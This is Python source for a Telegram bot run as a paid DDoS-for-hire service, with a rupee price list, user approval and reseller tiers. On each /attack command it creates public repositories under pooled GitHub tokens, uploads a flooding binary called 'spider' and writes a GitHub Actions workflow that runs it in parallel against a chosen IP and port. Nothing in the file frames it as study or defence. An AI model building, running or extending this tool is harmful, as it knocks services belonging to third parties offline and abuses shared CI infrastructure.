"""
SUPER POWERED ATTACK BOT - GITHUB DEPLOYMENT READY
Features: Parallel attacks, Auto-retry, Smart token rotation, Live dashboard
"""

import os
import sys
import json
import logging
import threading
import time
import uuid
import random
import string
import asyncio
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor, as_completed

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, ContextTypes, 
    MessageHandler, filters, ConversationHandler,
    CallbackQueryHandler
)
from github import Github, GithubException, RateLimitExceededException
from dotenv import load_dotenv
import aiohttp
import ujson as json

# ==================== CONFIG ====================
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN")
ADMIN_IDS = list(map(int, os.getenv("ADMIN_IDS", "7971134405").split(",")))
MAX_WORKERS = int(os.getenv("MAX_WORKERS", "50"))
ATTACK_TIMEOUT = int(os.getenv("ATTACK_TIMEOUT", "3600"))
COOLDOWN_DEFAULT = int(os.getenv("COOLDOWN_DEFAULT", "40"))
MAX_ATTACKS_DEFAULT = int(os.getenv("MAX_ATTACKS_DEFAULT", "100"))

# ==================== LOGGING ====================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ==================== DATA CLASSES ====================
@dataclass
class AttackTarget:
    ip: str
    port: int
    duration: int
    method: str = "UDP"
    user_id: int = 0
    
@dataclass
class AttackStatus:
    target: AttackTarget
    started_at: float
    estimated_end: float
    repos_used: int = 0
    repos_success: int = 0
    repos_failed: int = 0
    status: str = "running"  # running, completed, failed, stopped
    
    @property
    def elapsed(self) -> int:
        return int(time.time() - self.started_at)
    
    @property
    def remaining(self) -> int:
        return max(0, int(self.estimated_end - time.time()))
    
    def to_dict(self):
        data = asdict(self)
        data['target'] = asdict(self.target)
        return data

# ==================== DATA MANAGER ====================
class DataManager:
    DATA_DIR = "data"
    
    @classmethod
    def _ensure_dir(cls):
        os.makedirs(cls.DATA_DIR, exist_ok=True)
    
    @classmethod
    def _get_path(cls, filename):
        cls._ensure_dir()
        return os.path.join(cls.DATA_DIR, filename)
    
    @classmethod
    def load_json(cls, filename, default=None):
        path = cls._get_path(filename)
        if os.path.exists(path):
            try:
                with open(path, 'r') as f:
                    return json.load(f)
            except:
                return default or {}
        return default or {}
    
    @classmethod
    def save_json(cls, filename, data):
        path = cls._get_path(filename)
        with open(path, 'w') as f:
            json.dump(data, f, indent=2)
    
    # Specific loaders
    @classmethod
    def load_users(cls): return cls.load_json('users.json', [])
    @classmethod
    def save_users(cls, data): cls.save_json('users.json', data)
    
    @classmethod
    def load_approved(cls): return cls.load_json('approved_users.json', {})
    @classmethod
    def save_approved(cls, data): cls.save_json('approved_users.json', data)
    
    @classmethod
    def load_owners(cls): return cls.load_json('owners.json', {})
    @classmethod
    def save_owners(cls, data): cls.save_json('owners.json', data)
    
    @classmethod
    def load_admins(cls): return cls.load_json('admins.json', {})
    @classmethod
    def save_admins(cls, data): cls.save_json('admins.json', data)
    
    @classmethod
    def load_resellers(cls): return cls.load_json('resellers.json', {})
    @classmethod
    def save_resellers(cls, data): cls.save_json('resellers.json', data)
    
    @classmethod
    def load_tokens(cls): return cls.load_json('github_tokens.json', [])
    @classmethod
    def save_tokens(cls, data): cls.save_json('github_tokens.json', data)
    
    @classmethod
    def load_attack_history(cls): return cls.load_json('attack_history.json', [])
    @classmethod
    def save_attack_history(cls, data): cls.save_json('attack_history.json', data)
    
    @classmethod
    def load_attack_state(cls): return cls.load_json('attack_state.json', {})
    @classmethod
    def save_attack_state(cls, data): cls.save_json('attack_state.json', data)

# ==================== GITHUB MANAGER ====================
class GitHubManager:
    def __init__(self, tokens: List[Dict]):
        self.tokens = tokens
        self.token_index = 0
        self.repo_names = [
            "spider", "thor", "antman", "catwoman", "batman", "ironman",
            "superman", "flash", "hulk", "loki", "deadpool", "wolverine",
            "venom", "thanos", "drstrange", "blackpanther", "captainamerica",
            "hawkeye", "falcon", "vision", "aquaman", "cyborg", "greenlantern",
            "nightwing", "robin", "joker", "harleyquinn", "riddler", "penguin",
            "bane", "constantine", "raven", "starfire", "beastboy", "redhood",
            "ghostrider", "blade", "punisher", "moonknight", "daredevil",
            "storm", "rogue", "gambit", "cyclops", "phoenix", "colossus",
            "mystique", "ultron", "magneto", "thanos", "darkseid"
        ]
        self.used_repos = set()
        self.lock = threading.Lock()
    
    def get_next_token(self) -> Optional[Dict]:
        with self.lock:
            if not self.tokens:
                return None
            self.token_index = (self.token_index + 1) % len(self.tokens)
            return self.tokens[self.token_index]
    
    def get_random_repo_name(self) -> str:
        available = [r for r in self.repo_names if r not in self.used_repos]
        if not available:
            self.used_repos.clear()
            available = self.repo_names
        name = random.choice(available)
        self.used_repos.add(name)
        return f"{name}-{uuid.uuid4().hex[:8]}"
    
    def create_repo(self, token: str, repo_name: str) -> Tuple[bool, str]:
        try:
            g = Github(token)
            user = g.get_user()
            
            # Check if repo exists
            try:
                repo = user.get_repo(repo_name)
                return True, f"{user.login}/{repo_name}"
            except:
                repo = user.create_repo(
                    repo_name,
                    description="Attack Bot Repository",
                    private=False,
                    auto_init=True
                )
                return True, f"{user.login}/{repo_name}"
        except Exception as e:
            logger.error(f"Repo creation failed: {e}")
            return False, str(e)
    
    def update_file(self, token: str, repo_name: str, binary_content: bytes) -> bool:
        try:
            g = Github(token)
            repo = g.get_repo(repo_name)
            
            try:
                existing = repo.get_contents("spider")
                repo.update_file(
                    "spider",
                    "Update binary",
                    binary_content,
                    existing.sha
                )
            except:
                repo.create_file(
                    "spider",
                    "Upload binary",
                    binary_content
                )
            return True
        except Exception as e:
            logger.error(f"File update failed: {e}")
            return False
    
    def start_workflow(self, token: str, repo_name: str, target: AttackTarget) -> bool:
        try:
            g = Github(token)
            repo = g.get_repo(repo_name)
            
            # Create workflow file content
            yml_content = f"""name: Attack
on: [push]

jobs:
  attack:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x spider
    - run: sudo ./spider {target.ip} {target.port} {target.duration} 350
"""
            
            try:
                existing = repo.get_contents(".github/workflows/main.yml")
                repo.update_file(
                    ".github/workflows/main.yml",
                    f"Attack {target.ip}:{target.port}",
                    yml_content,
                    existing.sha
                )
            except:
                repo.create_file(
                    ".github/workflows/main.yml",
                    f"Attack {target.ip}:{target.port}",
                    yml_content
                )
            return True
        except Exception as e:
            logger.error(f"Workflow start failed: {e}")
            return False
    
    def stop_workflows(self, token: str, repo_name: str) -> int:
        try:
            g = Github(token)
            repo = g.get_repo(repo_name)
            cancelled = 0
            
            for status in ['queued', 'in_progress', 'pending']:
                for workflow in repo.get_workflow_runs(status=status):
                    try:
                        workflow.cancel()
                        cancelled += 1
                    except:
                        pass
            return cancelled
        except:
            return 0
    
    def check_token_health(self, token: str) -> Tuple[bool, int]:
        try:
            g = Github(token)
            rate = g.get_rate_limit()
            remaining = rate.core.remaining
            return True, remaining
        except:
            return False, 0

# ==================== ATTACK ENGINE ====================
class AttackEngine:
    def __init__(self, github_manager: GitHubManager):
        self.github = github_manager
        self.current_attack: Optional[AttackStatus] = None
        self.cooldown_until: float = 0
        self.lock = threading.Lock()
        self.executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
        self.binary_content: Optional[bytes] = None
        self.is_binary_uploaded = False
    
    def set_binary(self, content: bytes):
        self.binary_content = content
        self.is_binary_uploaded = True
    
    def can_start_attack(self, user_id: int, max_attacks: int = MAX_ATTACKS_DEFAULT) -> Tuple[bool, str]:
        with self.lock:
            # Check cooldown
            if time.time() < self.cooldown_until:
                remaining = int(self.cooldown_until - time.time())
                return False, f"⏳ Cooldown: {remaining}s remaining"
            
            # Check current attack
            if self.current_attack and self.current_attack.status == "running":
                return False, "⚡ Attack already running!"
            
            # Check user limits
            user_history = DataManager.load_attack_history()
            user_attacks = [a for a in user_history if a.get('user_id') == user_id]
            if len(user_attacks) >= max_attacks:
                return False, f"❌ You've reached max attacks ({max_attacks})"
            
            return True, "Ready"
    
    def start_attack(self, target: AttackTarget, user_id: int) -> AttackStatus:
        with self.lock:
            # Create attack status
            status = AttackStatus(
                target=target,
                started_at=time.time(),
                estimated_end=time.time() + target.duration,
                repos_used=len(self.github.tokens),
                repos_success=0,
                repos_failed=0,
                status="running"
            )
            self.current_attack = status
            
            # Save state
            DataManager.save_attack_state({
                'target': asdict(target),
                'started_at': status.started_at,
                'status': 'running'
            })
            
            # Start attack in background
            threading.Thread(target=self._execute_attack, args=(target, status), daemon=True).start()
            
            return status
    
    def _execute_attack(self, target: AttackTarget, status: AttackStatus):
        try:
            # Prepare repo creation + binary upload
            success_count = 0
            fail_count = 0
            
            # Get tokens and process in parallel
            tokens = self.github.tokens.copy()
            if not tokens:
                status.status = "failed"
                return
            
            # Create repos and upload binary
            with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, len(tokens))) as executor:
                futures = []
                for token_data in tokens:
                    if not self.is_binary_uploaded:
                        # Create repo if needed
                        repo_name = self.github.get_random_repo_name()
                        created, result = self.github.create_repo(token_data['token'], repo_name)
                        if created:
                            futures.append(executor.submit(
                                self._setup_repo,
                                token_data['token'],
                                result,
                                target
                            ))
                    else:
                        futures.append(executor.submit(
                            self._setup_repo,
                            token_data['token'],
                            token_data.get('repo'),
                            target
                        ))
                
                for future in as_completed(futures):
                    try:
                        success, repo_name = future.result(timeout=30)
                        if success:
                            success_count += 1
                        else:
                            fail_count += 1
                    except:
                        fail_count += 1
            
            # Update status
            status.repos_success = success_count
            status.repos_failed = fail_count
            status.status = "completed" if success_count > 0 else "failed"
            
            # Save to history
            history = DataManager.load_attack_history()
            history.append({
                **status.to_dict(),
                'user_id': target.user_id,
                'completed_at': time.time()
            })
            DataManager.save_attack_history(history[-1000:])  # Keep last 1000
            
            # Set cooldown
            with self.lock:
                self.cooldown_until = time.time() + COOLDOWN_DEFAULT
            
        except Exception as e:
            logger.error(f"Attack execution failed: {e}")
            status.status = "failed"
    
    def _setup_repo(self, token: str, repo_name: str, target: AttackTarget) -> Tuple[bool, str]:
        try:
            # Start workflow
            if not self.github.start_workflow(token, repo_name, target):
                return False, repo_name
            return True, repo_name
        except:
            return False, repo_name
    
    def stop_attack(self) -> int:
        with self.lock:
            if not self.current_attack:
                return 0
            
            total_stopped = 0
            with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, len(self.github.tokens))) as executor:
                futures = []
                for token_data in self.github.tokens:
                    futures.append(executor.submit(
                        self.github.stop_workflows,
                        token_data['token'],
                        token_data.get('repo')
                    ))
                for future in as_completed(futures):
                    try:
                        total_stopped += future.result(timeout=10)
                    except:
                        pass
            
            self.current_attack.status = "stopped"
            return total_stopped

# ==================== BOT HANDLER ====================
class BotHandler:
    def __init__(self, engine: AttackEngine, github_manager: GitHubManager):
        self.engine = engine
        self.github = github_manager
        self.conversation_states = {}
    
    # ============ USER COMMANDS ============
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        username = update.effective_user.username or str(user_id)
        
        # Check if user is approved
        approved = DataManager.load_approved()
        owners = DataManager.load_owners()
        
        if str(user_id) in owners or str(user_id) in approved:
            await update.message.reply_text(
                f"🔥 **SUPER BOT ACTIVATED** 🔥\n\n"
                f"👤 User: @{username}\n"
                f"🆔 ID: `{user_id}`\n"
                f"✅ Status: Authorized\n\n"
                f"**Commands:**\n"
                f"• /attack <ip> <port> <duration> - Start attack\n"
                f"• /status - Check attack status\n"
                f"• /stop - Stop current attack\n"
                f"• /myaccess - View your access\n"
                f"• /pricelist - View prices\n\n"
                f"⚡ **Parallel Attack Engine** - Uses all GitHub repos simultaneously!"
            )
        else:
            # Request access
            pending = DataManager.load_json('pending_users.json', [])
            if str(user_id) not in [str(u.get('user_id')) for u in pending]:
                pending.append({
                    'user_id': user_id,
                    'username': username,
                    'requested_at': time.time()
                })
                DataManager.save_json('pending_users.json', pending)
                
                # Notify owners
                for owner_id in owners.keys():
                    try:
                        await context.bot.send_message(
                            chat_id=int(owner_id),
                            text=f"📥 **New Access Request**\n"
                                 f"👤 @{username}\n"
                                 f"🆔 `{user_id}`\n"
                                 f"Use /add {user_id} <days> to approve"
                        )
                    except:
                        pass
            
            await update.message.reply_text(
                f"⏳ **Access Pending**\n\n"
                f"Your request has been sent to admins.\n"
                f"🆔 Your ID: `{user_id}`\n\n"
                f"Wait for approval or contact support."
            )
    
    async def attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        args = context.args
        
        if len(args) < 3:
            await update.message.reply_text(
                "❌ **Invalid Usage**\n"
                "Usage: `/attack <ip> <port> <duration>`\n"
                "Example: `/attack 1.1.1.1 80 60`"
            )
            return
        
        # Check authorization
        approved = DataManager.load_approved()
        owners = DataManager.load_owners()
        if str(user_id) not in owners and str(user_id) not in approved:
            await update.message.reply_text("❌ You are not authorized. Use /start to request access.")
            return
        
        try:
            ip = args[0]
            port = int(args[1])
            duration = int(args[2])
            
            if duration > ATTACK_TIMEOUT:
                await update.message.reply_text(f"⚠️ Max duration is {ATTACK_TIMEOUT}s")
                return
            
            target = AttackTarget(ip=ip, port=port, duration=duration, user_id=user_id)
            
            # Check if can start
            can_start, msg = self.engine.can_start_attack(user_id)
            if not can_start:
                await update.message.reply_text(msg)
                return
            
            # Start attack
            status = self.engine.start_attack(target, user_id)
            
            # Create inline keyboard for monitoring
            keyboard = [
                [InlineKeyboardButton("📊 Status", callback_data="status"),
                 InlineKeyboardButton("⏹ Stop", callback_data="stop")],
                [InlineKeyboardButton("🔄 Refresh", callback_data="refresh")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                f"🚀 **Attack Started!**\n\n"
                f"🎯 Target: `{ip}:{port}`\n"
                f"⏱ Duration: {duration}s\n"
                f"📦 Repos: {len(self.github.tokens)} active\n"
                f"🔄 Parallel: Yes ({MAX_WORKERS} workers)\n\n"
                f"⏳ ETA: {duration}s\n"
                f"Use /status for updates",
                reply_markup=reply_markup
            )
            
        except ValueError as e:
            await update.message.reply_text(f"❌ Invalid input: {e}")
        except Exception as e:
            logger.error(f"Attack error: {e}")
            await update.message.reply_text(f"❌ Error: {str(e)}")
    
    async def status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        status = self.engine.current_attack
        
        if not status or status.status != "running":
            # Check cooldown
            if time.time() < self.engine.cooldown_until:
                remaining = int(self.engine.cooldown_until - time.time())
                await update.message.reply_text(
                    f"⏳ **Cooldown Active**\n\n"
                    f"Wait {remaining}s before next attack."
                )
            else:
                await update.message.reply_text(
                    "✅ **No Active Attack**\n\n"
                    "System is ready. Use /attack to start."
                )
            return
        
        # Build status message
        progress = 1 - (status.remaining / status.target.duration)
        bar_length = 20
        filled = int(bar_length * progress)
        bar = "█" * filled + "░" * (bar_length - filled)
        
        await update.message.reply_text(
            f"⚡ **Attack Status**\n"
            f"{'='*20}\n\n"
            f"🎯 Target: `{status.target.ip}:{status.target.port}`\n"
            f"⏱ Elapsed: {status.elapsed}s / {status.target.duration}s\n"
            f"📊 Progress: {bar} {int(progress*100)}%\n"
            f"📦 Repos Success: {status.repos_success}\n"
            f"❌ Failed: {status.repos_failed}\n"
            f"⏳ Remaining: {status.remaining}s\n"
            f"🔄 Method: {status.target.method}\n"
            f"📋 Status: {status.status.upper()}"
        )
    
    async def stop(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if not self.engine.current_attack:
            await update.message.reply_text("❌ No active attack to stop")
            return
        
        stopped = self.engine.stop_attack()
        await update.message.reply_text(
            f"⏹ **Attack Stopped**\n\n"
            f"✅ {stopped} workflows cancelled\n"
            f"⏳ Cooldown: {COOLDOWN_DEFAULT}s"
        )
    
    async def myaccess(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        approved = DataManager.load_approved()
        owners = DataManager.load_owners()
        
        if str(user_id) in owners:
            role = "👑 Owner"
            expiry = "Lifetime"
        elif str(user_id) in approved:
            role = "✅ Approved User"
            user_data = approved.get(str(user_id), {})
            expiry = user_data.get('expiry', 'Unknown')
            if expiry != 'Lifetime':
                try:
                    exp_time = float(expiry)
                    days_left = int((exp_time - time.time()) / 86400)
                    expiry = f"{days_left} days"
                except:
                    pass
        else:
            role = "⏳ Pending"
            expiry = "N/A"
        
        # Attack stats
        history = DataManager.load_attack_history()
        user_attacks = [a for a in history if a.get('user_id') == user_id]
        
        await update.message.reply_text(
            f"📋 **Your Access**\n"
            f"{'='*20}\n\n"
            f"🆔 ID: `{user_id}`\n"
            f"👤 Role: {role}\n"
            f"⏳ Expiry: {expiry}\n"
            f"🎯 Attacks: {len(user_attacks)}\n\n"
            f"⚡ Max Workers: {MAX_WORKERS}\n"
            f"⏱ Max Duration: {ATTACK_TIMEOUT}s"
        )
    
    async def pricelist(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            f"💰 **Price List**\n"
            f"{'='*20}\n\n"
            f"📅 1 Day  - ₹120\n"
            f"📅 2 Days - ₹240\n"
            f"📅 3 Days - ₹360\n"
            f"📅 4 Days - ₹450\n"
            f"📅 7 Days - ₹650\n\n"
            f"💳 Reseller pricing available\n"
            f"Contact @owner for bulk deals"
        )
    
    async def help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            f"📖 **Help Center**\n"
            f"{'='*20}\n\n"
            f"**User Commands:**\n"
            f"• /start - Start bot\n"
            f"• /attack <ip> <port> <duration> - Start attack\n"
            f"• /status - Check attack status\n"
            f"• /stop - Stop attack\n"
            f"• /myaccess - View your access\n"
            f"• /pricelist - View prices\n"
            f"• /help - This menu\n\n"
            f"**Admin Commands:**\n"
            f"• /add <user_id> <days> - Add user\n"
            f"• /remove <user_id> - Remove user\n"
            f"• /userslist - List users\n"
            f"• /addtoken <token> - Add GitHub token\n"
            f"• /tokens - List tokens\n"
            f"• /removetoken <index> - Remove token\n"
            f"• /binary_upload - Upload binary\n"
            f"• /broadcast - Send broadcast\n"
            f"• /maintenance on/off - Toggle maintenance\n"
            f"• /setcooldown <seconds> - Set cooldown\n"
            f"• /setmaxattack <number> - Set max attacks\n"
            f"• /addowner <user_id> <username> - Add owner\n"
            f"• /deleteowner <user_id> - Remove owner"
        )
    
    # ============ ADMIN COMMANDS ============
    async def add(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        owners = DataManager.load_owners()
        
        if str(user_id) not in owners:
            await update.message.reply_text("❌ Only owners can use this command")
            return
        
        args = context.args
        if len(args) < 2:
            await update.message.reply_text("Usage: /add <user_id> <days>")
            return
        
        try:
            new_user = int(args[0])
            days = int(args[1])
            
            approved = DataManager.load_approved()
            approved[str(new_user)] = {
                'added_by': user_id,
                'added_at': time.time(),
                'expiry': time.time() + (days * 86400) if days > 0 else 'Lifetime',
                'days': days
            }
            DataManager.save_approved(approved)
            
            await update.message.reply_text(
                f"✅ **User Added**\n"
                f"🆔 `{new_user}`\n"
                f"📅 {days} days\n"
                f"👤 Added by: `{user_id}`"
            )
            
            # Notify user
            try:
                await context.bot.send_message(
                    chat_id=new_user,
                    text=f"🎉 **Access Approved!**\n"
                         f"You now have {days} days of access.\n"
                         f"Use /start to begin!"
                )
            except:
                pass
                
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID or days")
    
    async def remove(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        owners = DataManager.load_owners()
        admins = DataManager.load_admins()
        
        if str(user_id) not in owners and str(user_id) not in admins:
            await update.message.reply_text("❌ Unauthorized")
            return
        
        if len(context.args) < 1:
            await update.message.reply_text("Usage: /remove <user_id>")
            return
        
        try:
            user_to_remove = int(context.args[0])
            approved = DataManager.load_approved()
            
            if str(user_to_remove) in approved:
                del approved[str(user_to_remove)]
                DataManager.save_approved(approved)
                await update.message.reply_text(f"✅ User `{user_to_remove}` removed")
            else:
                await update.message.reply_text(f"❌ User `{user_to_remove}` not found")
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID")
    
    async def userslist(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        owners = DataManager.load_owners()
        admins = DataManager.load_admins()
        
        if str(user_id) not in owners and str(user_id) not in admins:
            await update.message.reply_text("❌ Unauthorized")
            return
        
        approved = DataManager.load_approved()
        if not approved:
            await update.message.reply_text("📭 No users found")
            return
        
        msg = "👥 **User List**\n" + "="*20 + "\n"
        for uid, data in approved.items():
            exp = data.get('expiry', '?')
            if exp != 'Lifetime':
                try:
                    days_left = int((float(exp) - time.time()) / 86400)
                    exp = f"{days_left}d"
                except:
                    pass
            msg += f"🆔 `{uid}` - {exp}\n"
        
        msg += f"\n📊 Total: {len(approved)}"
        await update.message.reply_text(msg)
    
    async def addtoken(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        owners = DataManager.load_owners()
        
        if str(user_id) not in owners:
            await update.message.reply_text("❌ Only owners can add tokens")
            return
        
        if len(context.args) < 1:
            await update.message.reply_text("Usage: /addtoken <github_token>")
            return
        
        token = context.args[0]
        
        try:
            g = Github(token)
            user = g.get_user()
            
            tokens = DataManager.load_tokens()
            
            # Check if already exists
            for t in tokens:
                if t.get('token') == token:
                    await update.message.reply_text("❌ Token already exists")
                    return
            
            tokens.append({
                'token': token,
                'username': user.login,
                'added_at': time.time(),
                'status': 'active'
            })
            DataManager.save_tokens(tokens)
            
            # Update GitHub manager
            self.github.tokens = tokens
            
            await update.message.reply_text(
                f"✅ **Token Added**\n"
                f"👤 @{user.login}\n"
                f"🔑 `{token[:10]}...`\n"
                f"📊 Total: {len(tokens)}"
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ Invalid token: {str(e)}")
    
    async def tokens(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        owners = DataManager.load_owners()
        
        if str(user_id) not in owners:
            await update.message.reply_text("❌ Unauthorized")
            return
        
        tokens = DataManager.load_tokens()
        if not tokens:
            await update.message.reply_text("📭 No tokens found")
            return
        
        msg = "🔑 **Token List**\n" + "="*20 + "\n"
        for i, t in enumerate(tokens, 1):
            msg += f"{i}. @{t.get('username', 'unknown')} - `{t.get('token', '')[:8]}...`\n"
        
        await update.message.reply_text(msg)
    
    async def removetoken(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        owners = DataManager.load_owners()
        
        if str(user_id) not in owners:
            await update.message.reply_text("❌ Unauthorized")
            return
        
        if len(context.args) < 1:
            await update.message.reply_text("Usage: /removetoken <index>")
            return
        
        try:
            index = int(context.args[0]) - 1
            tokens = DataManager.load_tokens()
            
            if 0 <= index < len(tokens):
                removed = tokens.pop(index)
                DataManager.save_tokens(tokens)
                self.github.tokens = tokens
                await update.message.reply_text(f"✅ Removed token for @{removed.get('username', 'unknown')}")
            else:
                await update.message.reply_text("❌ Invalid index")
        except ValueError:
            await update.message.reply_text("❌ Invalid index")
    
    async def binary_upload(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        owners = DataManager.load_owners()
        
        if str(user_id) not in owners:
            await update.message.reply_text("❌ Unauthorized")
            return
        
        await update.message.reply_text(
            "📤 **Upload Binary**\n"
            "Send the `spider` binary file now.\n"
            "Use /cancel to cancel."
        )
        return 1  # WAITING_FOR_BINARY
    
    async def handle_binary(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if not update.message.document:
            await update.message.reply_text("❌ Please send a file")
            return 1
        
        try:
            file = await update.message.document.get_file()
            file_path = f"temp_binary_{user_id}.bin"
            await file.download_to_drive(file_path)
            
            with open(file_path, 'rb') as f:
                content = f.read()
            
            # Store binary
            self.engine.set_binary(content)
            
            # Upload to all repos
            tokens = DataManager.load_tokens()
            success = 0
            fail = 0
            
            msg = await update.message.reply_text(f"📤 Uploading to {len(tokens)} repos...")
            
            with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, len(tokens))) as executor:
                futures = []
                for token_data in tokens:
                    repo_name = token_data.get('repo')
                    if not repo_name:
                        repo_name = self.github.get_random_repo_name()
                        created, repo_name = self.github.create_repo(token_data['token'], repo_name)
                    
                    futures.append(executor.submit(
                        self.github.update_file,
                        token_data['token'],
                        repo_name,
                        content
                    ))
                
                for future in as_completed(futures):
                    if future.result():
                        success += 1
                    else:
                        fail += 1
            
            os.remove(file_path)
            
            await msg.edit_text(
                f"✅ **Binary Upload Complete**\n"
                f"📁 Size: {len(content)} bytes\n"
                f"✅ Success: {success}\n"
                f"❌ Failed: {fail}"
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        
        return ConversationHandler.END
    
    async def cancel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("❌ Cancelled")
        return ConversationHandler.END
    
    async def broadcast(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        owners = DataManager.load_owners()
        
        if str(user_id) not in owners:
            await update.message.reply_text("❌ Unauthorized")
            return
        
        if len(context.args) < 1:
            await update.message.reply_text("Usage: /broadcast <message>")
            return
        
        message = " ".join(context.args)
        
        # Get all users
        approved = DataManager.load_approved()
        owners_data = DataManager.load_owners()
        admins_data = DataManager.load_admins()
        
        all_users = set()
        all_users.update(approved.keys())
        all_users.update(owners_data.keys())
        all_users.update(admins_data.keys())
        
        success = 0
        fail = 0
        
        status_msg = await update.message.reply_text(f"📢 Broadcasting to {len(all_users)} users...")
        
        for uid in all_users:
            try:
                await context.bot.send_message(
                    chat_id=int(uid),
                    text=f"📢 **Broadcast**\n{message}"
                )
                success += 1
                time.sleep(0.1)
            except:
                fail += 1
        
        await status_msg.edit_text(
            f"✅ **Broadcast Complete**\n"
            f"✅ Sent: {success}\n"
            f"❌ Failed: {fail}"
        )

# ==================== MAIN APPLICATION ====================
def main():
    # Initialize managers
    tokens = DataManager.load_tokens()
    github_manager = GitHubManager(tokens)
    engine = AttackEngine(github_manager)
    handler = BotHandler(engine, github_manager)
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # User commands
    application.add_handler(CommandHandler("start", handler.start))
    application.add_handler(CommandHandler("attack", handler.attack))
    application.add_handler(CommandHandler("status", handler.status))
    application.add_handler(CommandHandler("stop", handler.stop))
    application.add_handler(CommandHandler("myaccess", handler.myaccess))
    application.add_handler(CommandHandler("pricelist", handler.pricelist))
    application.add_handler(CommandHandler("help", handler.help))
    
    # Admin commands
    application.add_handler(CommandHandler("add", handler.add))
    application.add_handler(CommandHandler("remove", handler.remove))
    application.add_handler(CommandHandler("userslist", handler.userslist))
    application.add_handler(CommandHandler("addtoken", handler.addtoken))
    application.add_handler(CommandHandler("tokens", handler.tokens))
    application.add_handler(CommandHandler("removetoken", handler.removetoken))
    application.add_handler(CommandHandler("broadcast", handler.broadcast))
    
    # Binary upload conversation
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("binary_upload", handler.binary_upload)],
        states={
            1: [MessageHandler(filters.Document.ALL, handler.handle_binary)]
        },
        fallbacks=[CommandHandler("cancel", handler.cancel)]
    )
    application.add_handler(conv_handler)
    
    # Callback query handler for inline buttons
    async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        if query.data == "status":
            await handler.status(update, context)
        elif query.data == "stop":
            await handler.stop(update, context)
        elif query.data == "refresh":
            # Refresh the message
            await handler.status(update, context)
    
    application.add_handler(CallbackQueryHandler(callback_handler))
    
    # Start bot
    print("🔥 SUPER BOT ACTIVATED")
    print("=" * 30)
    print(f"👥 Owners: {len(DataManager.load_owners())}")
    print(f"👤 Users: {len(DataManager.load_approved())}")
    print(f"🔑 Tokens: {len(DataManager.load_tokens())}")
    print(f"⚡ Workers: {MAX_WORKERS}")
    print(f"⏱ Cooldown: {COOLDOWN_DEFAULT}s")
    print("=" * 30)
    
    application.run_polling()

if __name__ == "__main__":
    main()
